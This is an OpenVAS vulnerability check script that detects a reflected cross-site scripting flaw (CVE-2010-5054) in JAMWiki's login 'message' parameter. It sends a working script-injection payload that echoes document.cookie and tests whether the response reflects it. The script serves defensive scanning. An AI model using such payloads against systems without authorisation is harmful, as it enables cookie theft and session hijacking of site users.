##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_jamwiki_message_param_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# JAMWiki 'message' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902595");
  script_version("$Revision: 11997 $");
  script_bugtraq_id(39225);
  script_cve_id("CVE-2010-5054");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-12-13 12:12:12 +0530 (Tue, 13 Dec 2011)");
  script_name("JAMWiki 'message' Parameter Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/39335");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/57630");
  script_xref(name:"URL", value:"http://jamwiki.svn.sourceforge.net/viewvc/jamwiki/wiki/branches/0.8.x/jamwiki-war/src/main/webapp/CHANGELOG.txt?view=markup&revision=2995");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.");
  script_tag(name:"affected", value:"JAMWiki versions prior to 0.8.4");
  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input to the
  'message' parameter via Special:Login in error.jsp, which allows attackers
  to execute arbitrary HTML and script code in a user's browser session in
  the context of an affected site.");
  script_tag(name:"solution", value:"Upgrade to JAMWiki version 0.8.4 or later.");
  script_tag(name:"summary", value:"This host is running JAMWiki and is prone to cross-site scripting
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://jamwiki.org/wiki/en/JAMWiki");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8080);

foreach dir (make_list_unique("/jamwiki", "/JAMWiki", "/wiki", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  req = http_get(item: dir + "/en/StartingPoints", port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  if('>JAMWiki<' >< res)
  {
    url = dir + "/en/Special:Login?message=><script>alert(document.cookie)" +
                "</script>";

    if(http_vuln_check(port:port, url:url, check_header: TRUE,
       pattern:"><script>alert\(document.cookie\)</script>"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);